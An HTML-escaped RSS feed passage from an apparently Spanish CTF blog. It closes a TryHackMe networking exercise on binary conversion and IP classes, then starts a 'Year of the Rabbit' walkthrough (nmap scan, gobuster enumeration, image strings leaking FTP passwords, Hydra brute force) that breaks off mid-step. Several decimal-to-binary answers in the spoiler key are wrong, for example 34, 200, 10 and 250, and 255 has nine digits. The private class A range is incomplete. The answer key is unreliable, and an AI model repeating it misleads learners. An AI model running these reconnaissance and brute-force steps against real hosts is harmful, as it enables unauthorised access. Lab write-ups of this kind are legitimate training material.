&lt;th&gt;4&lt;/th&gt;
&lt;th&gt;2&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Si el numero es 1 tomamos el numero, si es 0, no.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Numeros Guia&lt;/th&gt;
&lt;th&gt;128&lt;/th&gt;
&lt;th&gt;64&lt;/th&gt;
&lt;th&gt;32&lt;/th&gt;
&lt;th&gt;16&lt;/th&gt;
&lt;th&gt;8&lt;/th&gt;
&lt;th&gt;4&lt;/th&gt;
&lt;th&gt;2&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Binario&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Decimal&lt;/td&gt;
&lt;td&gt;128&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;16&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Ahora que tenemos los numeros, sumamos todos (no es necesario tomar los 0&amp;rsquo;s) y obtenemos el resultado:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;128+0+0+16+0+0+2+0&lt;/th&gt;
&lt;th&gt;= 146&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;/table&gt;
&lt;p&gt;Realizamos lo mismo para todos los numeros.&lt;/p&gt;
&lt;div class=&#34;alert alert-danger&#34; role=&#34;alert&#34; data-dir=&#34;ltr&#34;&gt;&lt;strong&gt;SPOILER WARNING&lt;/strong&gt;&lt;/div&gt;

&lt;details&gt;
  &lt;summary&gt;RESPUESTAS - SPOILER WARNING&lt;/summary&gt;
&lt;pre&gt;&lt;code&gt;1001 0010 = 128+16+2 = 146
0111 0111 = 64+32+16+4+2+1 = 119
1111 1111 = 128+64+32+16+8+4+2+1 = 255
1100 0101 = 128+64+4+1 = 197
1111 0110 = 128+64+32+16+4+2 = 246
0001 0011 = 16+2+1 = 19
1000 0001 = 128+1 = 129
0011 0001 = 32+16+1 = 49
0111 1000 = 64+32+16+8 = 120
1111 0000 = 128+64+32+16 = 240
0011 1011 = 32+16+8+2+1 = 59
0000 0111 = 4+2+1 = 7
&lt;/code&gt;&lt;/pre&gt;&lt;/details&gt;
&lt;h2 id=&#34;decimal-to-binary&#34;&gt;Decimal to Binary &lt;/h2&gt;
&lt;center&gt;
&lt;div style=&#34;background:white; padding:15px; border-radius:5px&#34;&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bpnetworking/3.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/center&gt;
&lt;p&gt;Para convertir de decimal a Binario, tomamos el numero y lo dividimos dentro de 2, hasta llegar a su minima expresion (0). Si el resultado o numero es par entonces colocamos 0 si es impar 1. El primer número quedaria de la siguiente forma:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;238 	= 238   -----&amp;gt; 0
238 / 2 = 119   -----&amp;gt; 1
119 / 2 = 59    -----&amp;gt; 1
59 / 2  = 29    -----&amp;gt; 1
29 / 2  = 14    -----&amp;gt; 0
14 / 2  = 7     -----&amp;gt; 1
7 / 2   = 3     -----&amp;gt; 1
3 / 2   = 1     -----&amp;gt; 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;El resultado se lee de abajo hacia arriba: &lt;code&gt;1110 1110&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Realizamos lo mismo para todos los numeros.&lt;/p&gt;
&lt;div class=&#34;alert alert-danger&#34; role=&#34;alert&#34; data-dir=&#34;ltr&#34;&gt;&lt;strong&gt;SPOILER WARNING&lt;/strong&gt;&lt;/div&gt;

&lt;details&gt;
  &lt;summary&gt;RESPUESTAS - SPOILER WARNING&lt;/summary&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;34&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0100&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;123&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0111&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1011&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0011&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0010&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;255&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;01111&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1111&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0110&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0100&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0101&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;138&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0100&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0101&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0001&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1101&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;250&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0111&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1101&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;114&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0111&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0010&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;h2 id=&#34;address-class-identification&#34;&gt;Address Class Identification &lt;/h2&gt;
&lt;p&gt;En esta seccion se necesita identificar a la clase que pertenece la IP dada utilizando la tabla.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Clases de direcciones IP&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Clase&lt;/th&gt;
&lt;th&gt;Rango&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Clase A&lt;/td&gt;
&lt;td&gt;1-127&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase B&lt;/td&gt;
&lt;td&gt;128-191&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase C&lt;/td&gt;
&lt;td&gt;192-223&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase D&lt;/td&gt;
&lt;td&gt;224-239&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase E&lt;/td&gt;
&lt;td&gt;240-255&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;Espacio de direcciones privadas&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Clase&lt;/th&gt;
&lt;th&gt;Rango&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Clase A&lt;/td&gt;
&lt;td&gt;10.0.0.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase B&lt;/td&gt;
&lt;td&gt;172.16.0.0 a 172.31.255.255&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Clase C&lt;/td&gt;
&lt;td&gt;192.168.0.0 a 192.168.255.255&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&#34;alert alert-danger&#34; role=&#34;alert&#34; data-dir=&#34;ltr&#34;&gt;&lt;strong&gt;SPOILER WARNING&lt;/strong&gt;&lt;/div&gt;

&lt;details&gt;
  &lt;summary&gt;RESPUESTAS - SPOILER WARNING&lt;/summary&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;10.240.1.1 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; A
150.10.15.0 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; B
192.14.2.0 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; C
148.17.9.1 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; B
193.42.1.1 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; C
126.8.156.0 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; A
220.200.23.1 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; C
230.230.45.58 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; D
177.100.18.4 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; B
119.18.45.0 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; A
117.89.56.45 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; A
215.45.45.0 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; C
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://ipaddress.standingtech.com/online-ip-address-class-finder-detector&#34;&gt;&lt;strong&gt;Obtener respuestas de Forma Facil&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/details&gt;
&lt;p&gt;&lt;strong&gt;Links de ayuda&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.es.paessler.com/it-explained/ip-address&#34;&gt;&lt;strong&gt;Dirección IP&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.tutorialspoint.com/es/ipv4/ipv4_reserved_addresses.htm&#34;&gt;&lt;strong&gt;IPv4 - Direcciones Reservadas&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://superuser.com/questions/288267/what-are-the-common-router-default-dhcp-ip-address-ranges&#34;&gt;&lt;strong&gt;common router default DHCP IP address ranges?&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io//images/posts/thm/bpnetworking/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        
        
          
            
              <category>challenge</category>
            
          
        
        
        
      </item>
      
      <item>
        <title>TryHackMe - Year of the Rabbit</title>
        <link>https://sckull.github.io/posts/yearoftherabbit/</link>
        <pubDate>Sun, 28 Jun 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sun, 28 Jun 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/yearoftherabbit/</guid>
        <description>Year of the Rabbit es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.</description>
        <content:encoded>&lt;p&gt;Year of the Rabbit es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Year of the Rabbit&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Time to enter the warren&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;310&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MuirlandOracle&#34;&gt;MuirlandOracle&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sun Jun 28 21:19:18 2020 as: nmap -sV -o nmap_scan_mini rabbit.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; rabbit.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.93.147&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.22s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.10 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Jun 28 21:19:55 2020 -- 1 IP address (1 host up) scanned in 36.98 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sun Jun 28 21:19:17 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan rabbit.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; rabbit.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.93.147&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.10 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.10 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Jun 28 21:35:05 2020 -- 1 IP address (1 host up) scanned in 947.91 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_202708.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/yearoftherabbit# gobuster dir -u http://rabbit.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el directorio assets encontramos dos archivos, un archivo mp4 y una hoja de estilos (CSS).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_202913.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la hoja de estilos encontramos una direccion hacia una pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_203755.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar la pagina nos redirige hacia un video de youtube, desactivamos javascript en nuestro navegador y vemos un video incrustado en la pagina, es el mismo que se encuentra en &lt;code&gt;/assets/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_204041.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;BurpSuite&lt;/code&gt; y encontramos que realiza una peticion a una pagina con un parametro de un directorio.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_213545.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos realizar detectar alguna vulnerabilidad en esta pagina y su parametro pero no encontramos alguno. Ya que indica un directorio, utilizamos este en la pagina y encontramos una imagen.webp.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_213652.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;ftp---user&#34;&gt;FTP - USER&lt;/h2&gt;
&lt;p&gt;Descargamos la imagen y revisamos las strings dentro de esta, encontramos un mensaje con una lista de posibles contraseñas de un usuario en el servicio ftp.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/Screenshot_20200628_214007.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;HYDRA&lt;/code&gt; con el usuario y wordlist encontrado en el servicio ftp y logramos encontrar las credenciales.&lt;br /&gt;
